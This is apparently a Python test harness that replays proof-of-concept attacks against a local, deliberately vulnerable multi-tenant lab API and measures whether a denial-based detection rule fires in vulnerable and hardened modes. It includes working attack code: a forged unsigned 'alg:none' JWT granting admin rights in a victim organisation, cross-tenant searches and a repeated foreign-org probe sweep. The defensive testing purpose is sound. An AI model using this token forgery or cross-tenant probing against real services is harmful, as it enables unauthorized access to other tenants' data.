#!/usr/bin/env python3
"""Replay the M1 PoCs against a live stack and MEASURE the detection rule.

T8's deliverable is not "the rule fires" but a measured detect/miss
matrix: for every scenario x mode cell, does rule.find_alerts fire when
it should and stay silent when it should not? A detection claim that is
not measured is an opinion.

Scenarios (each drives the live API over HTTP, like a real attacker):
  A. finding 01 -- honest token, cross-tenant search (the T6 PoC)
  B. finding 02 -- forged alg:none token, foreign-org create (the T6 PoC)
  C. probe sweep -- honest token, foreign org in the PATH, repeated
     (the T6-discovered third variant; the only scenario whose hardened
     path reaches resolveHardenedStore's membership check and logs
     SR-B2-8 denial lines)

Modes: the harness takes --hardened (or not) and assumes the stack it is
pointed at is ALREADY in that mode (make up / make harden own the stack;
this tool only replays). It never flips modes itself, so `make detect`
sequences the two runs.

Log collection: bb-api's container logs persist across mode flips, so
the harness snapshots `docker logs` output length before each scenario
and analyzes only the DELTA. The collection window is part of the rule's
correctness: stale denials from a previous mode leaking into this
measurement would inflate both counts and credibility.

Expected matrix (and the assertion that makes this a regression test):
                       vulnerable        hardened
  A finding 01         miss (attack      miss (blocked by
                       succeeds, no      query scoping -- no
                       denial exists)    denial line, by SR-M1-4)
  B finding 02         miss (attack      miss (blocked at the
                       succeeds)         verifier, before authz)
  C probe sweep        miss (succeeds -- N/A in vulnerable mode: the
                       no membership      vulnerable path never
                       check exists)      checks membership, so no
                                          denial is possible; the
                                          sweep SUCCEEDS instead
                                          (asserted as such)

So the honest expectation is: the rule detects exactly the cells where
a denial LINE exists -- C/hardened (fires) -- and correctly misses
everywhere else. The lesson the matrix encodes: a denial-based detector
is coupled to the control working. Where the control blocks silently
(indistinguishability, SR-M1-4) or earlier (the verifier, SR-B2-3),
detection is blind, and THAT is what the T7 regression suite is for --
the two mechanisms cover disjoint failure worlds. Printing that matrix
is the point of T8.

Exit codes: 0 = every cell matched expectation; 1 = a mismatch (either
the rule misfired or a control silently regressed -- both are findings);
2 = operational error (stack down, docker unavailable).
"""

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, __file__.rsplit("/", 1)[0])

import rule  # noqa: E402

PROBE_COUNT = rule.DEFAULT_THRESHOLD + 2   # clearly over threshold
GLOBEX = "admin@globex.example"
ACME = "admin@acme.example"
PASSWORD = "bazaar-dev-only"


def die_operational(msg):
    print(f"OPERATIONAL ERROR: {msg}", file=sys.stderr)
    sys.exit(2)


def request(method, path, body=None, token=None, base=None):
    req = urllib.request.Request(method=method, url=base + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, data) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except urllib.error.URLError as e:
        die_operational(f"cannot reach {path}: {e.reason}")


def docker_logs_bytes():
    out = subprocess.run(["docker", "logs", "bb-api"], capture_output=True)
    if out.returncode != 0:
        die_operational("docker logs bb-api failed -- is the stack up?")
    return len(out.stdout) + len(out.stderr)


def docker_logs_since(mark):
    out = subprocess.run(["docker", "logs", "bb-api"], capture_output=True, text=True)
    if out.returncode != 0:
        die_operational("docker logs bb-api failed mid-run")
    return (out.stdout + out.stderr)[mark:]


def login(base, email):
    st, body = request("POST", "/auth/token",
                       body={"email": email, "password": PASSWORD}, base=base)
    if st != 200:
        die_operational(f"login as {email} -> {st} {body}")
    tok = json.loads(body)["token"]
    st, body = request("GET", "/me", token=tok, base=base)
    if st != 200:
        die_operational(f"/me for {email} -> {st}")
    me = json.loads(body)
    return tok, me["sub"], me["org_id"]


def scenario_a(base):
    """Finding 01: honest token, cross-tenant search."""
    tok, _sub, org = login(base, GLOBEX)
    st, _ = request("GET", f"/orgs/{org}/documents?q=confidential",
                    token=tok, base=base)
    return st


def scenario_b(base):
    """Finding 02: forged alg:none token, foreign-org create + cleanup."""
    import base64
    tok, sub, _org = login(base, GLOBEX)
    _, _vs, victim_org = login(base, ACME)

    def b64(obj):
        return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")

    now = int(time.time())
    header = b64({"alg": "none", "typ": "JWT"})
    claims = b64({"sub": sub, "org_id": victim_org, "role": "admin",
                  "iss": "brokenbazaar", "iat": now, "exp": now + 3600})
    forged = f"{header}.{claims}."
    st, body = request("POST", f"/orgs/{victim_org}/documents",
                       body={"org_id": victim_org, "title": "BB02-REPLAY",
                             "body": "replay"},
                       token=forged, base=base)
    if st == 201:  # cleanup
        request("DELETE", f"/orgs/{victim_org}/documents/{json.loads(body)['id']}",
                token=forged, base=base)
    return st


def scenario_c(base):
    """Third variant: honest token, FOREIGN org in the path, repeated."""
    tok, _sub, _org = login(base, GLOBEX)
    _, _vs, victim_org = login(base, ACME)
    statuses = []
    for _ in range(PROBE_COUNT):
        st, _ = request("GET", f"/orgs/{victim_org}/documents",
                        token=tok, base=base)
        statuses.append(st)
    return statuses[0]


SCENARIOS = {
    "A finding-01 (honest cross-tenant search)": scenario_a,
    "B finding-02 (forged alg:none create)": scenario_b,
    "C probe sweep (honest token, foreign org path x%d)" % PROBE_COUNT:
        scenario_c,
}

# (scenario, hardened?) -> (attack_summary_status, expect_detection)
# Attack outcomes asserted separately from detection; see docstring matrix.
EXPECT = {
    ("A", False): (200, False), ("A", True): (200, False),   # 200 = 1-doc scoped list
    ("B", False): (201, False), ("B", True): (401, False),
    ("C", False): (200, False), ("C", True): (404, True),
}


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--base-url", default="http://localhost:8080")
    ap.add_argument("--hardened", action="store_true",
                    help="assert the hardened-mode expectations")
    args = ap.parse_args()
    base = args.base_url.rstrip("/")
    mode = "hardened" if args.hardened else "vulnerable"

    rows = []
    mismatches = []
    for name, fn in SCENARIOS.items():
        key = name.split(" ")[0]
        mark = docker_logs_bytes()
        summary = fn(base)
        time.sleep(0.5)  # let the last log line flush
        delta = docker_logs_since(mark)
        alerts = rule.find_alerts(delta.splitlines())
        want_status, want_detect = EXPECT[(key, args.hardened)]

        attack_ok = (summary == want_status)
        detect_ok = (len(alerts) > 0) == want_detect
        cell = "detect" if alerts else "miss"
        row_ok = attack_ok and detect_ok
        if not row_ok:
            mismatches.append((name, summary, want_status, cell, want_detect))
        rows.append((name, summary, cell, "PASS" if row_ok else "FAIL"))

    print(f"detection replay [{mode}] against {base}")
    print(f"  rule: {rule.DEFAULT_THRESHOLD} denials from one principal")
    print()
    for name, status, cell, verdict in rows:
        print(f"  {verdict}  {name}")
        print(f"        attack status: {status}   detection: {cell}")
    print()
    if mismatches:
        for name, got, want, cell, wantd in mismatches:
            print(f"MISMATCH {name}: attack {got} (want {want}), "
                  f"detection {cell} (want {'detect' if wantd else 'miss'})")
        print("\ndetection replay: matrix mismatch -- a rule misfire or a silent control regression")
        return 1
    print("detection replay: every cell matched expectation")
    return 0


if __name__ == "__main__":
    sys.exit(main())
